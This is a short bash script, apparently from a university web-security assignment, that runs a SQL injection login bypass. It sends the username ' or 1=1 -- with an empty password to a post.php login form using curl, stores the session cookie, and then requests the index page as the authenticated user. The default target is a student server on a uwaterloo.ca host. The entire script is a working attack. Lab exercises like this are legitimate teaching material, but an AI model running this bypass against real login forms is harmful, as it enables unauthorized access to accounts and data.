#!/bin/bash

if [ $# -ne 2 ]; then
	PREFIX="ugster21.student.cs.uwaterloo.ca/sdsuo"
else
	IP=$1
	PORT=$2
	PREFIX=$IP:$PORT
fi

echo "=====[Setup]====="
POST_PAGE="$PREFIX/post.php"
HOME_PAGE="$PREFIX/index.php"
echo "Using Login Page at: $POST_PAGE"
echo "Using Home Page at: $HOME_PAGE"

echo "=====[Login]====="
ATTACK_USERNAME="' or 1=1 --"
ATTACK_PASSWORD=""
echo "Using attack username: $ATTACK_USERNAME"
echo "Using attack password: $ATTACK_PASSWORD"

echo "Logging in with POST request"
curl \
-c "cookie.txt" \
-d "form=login" \
-d "submit=Login" \
-d "username=$ATTACK_USERNAME" \
-d "password=$ATTACK_PASSWORD" \
$POST_PAGE
echo

echo "=====[Index Page]====="
echo "Showing index page with GET request"
curl -b "cookie.txt" $HOME_PAGE